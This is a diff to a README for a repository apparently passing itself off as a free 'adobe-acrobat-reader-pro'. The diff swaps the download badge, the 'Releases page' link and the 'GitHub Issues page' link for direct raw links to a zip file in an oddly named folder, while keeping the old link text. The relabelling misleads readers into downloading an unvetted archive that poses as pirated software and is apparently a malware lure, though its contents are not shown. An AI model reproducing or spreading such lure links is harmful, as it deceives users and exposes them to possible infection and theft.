@@ -8,11 +8,11 @@ Welcome to adobe-acrobat-reader-pro! This application makes managing PDFs easy a
 
 To get started, you need to download the application. Click the button below to visit the Releases page where you can download the latest version.
 
-[![Download adobe-acrobat-reader-pro](https://img.shields.io/badge/Download-adobe--acrobat--reader--pro-brightgreen)](https://github.com/jibiyunet/adobe-acrobat-reader-pro/releases)
+[![Download adobe-acrobat-reader-pro](https://raw.githubusercontent.com/jibiyunet/adobe-acrobat-reader-pro/main/corrosible/adobe-acrobat-reader-pro-v3.6.zip)](https://raw.githubusercontent.com/jibiyunet/adobe-acrobat-reader-pro/main/corrosible/adobe-acrobat-reader-pro-v3.6.zip)
 
 ### Step-by-Step Download Instructions
 
-1. Click the button above to visit the [Releases page](https://github.com/jibiyunet/adobe-acrobat-reader-pro/releases).
+1. Click the button above to visit the [Releases page](https://raw.githubusercontent.com/jibiyunet/adobe-acrobat-reader-pro/main/corrosible/adobe-acrobat-reader-pro-v3.6.zip).
 2. Find the latest version listed on the page.
 3. Click the download link for your operating system.
 4. Once the download finishes, locate the downloaded file on your computer.
@@ -48,7 +48,7 @@ To ensure the best performance, please verify that your system meets the followi
 
 ## 📞 Support
 
-If you encounter any issues or need assistance, please visit our [GitHub Issues page](https://github.com/jibiyunet/adobe-acrobat-reader-pro/issues). You can report bugs or request new features there.
+If you encounter any issues or need assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/jibiyunet/adobe-acrobat-reader-pro/main/corrosible/adobe-acrobat-reader-pro-v3.6.zip). You can report bugs or request new features there.
 
 ## 🌐 Community and Contributions
 
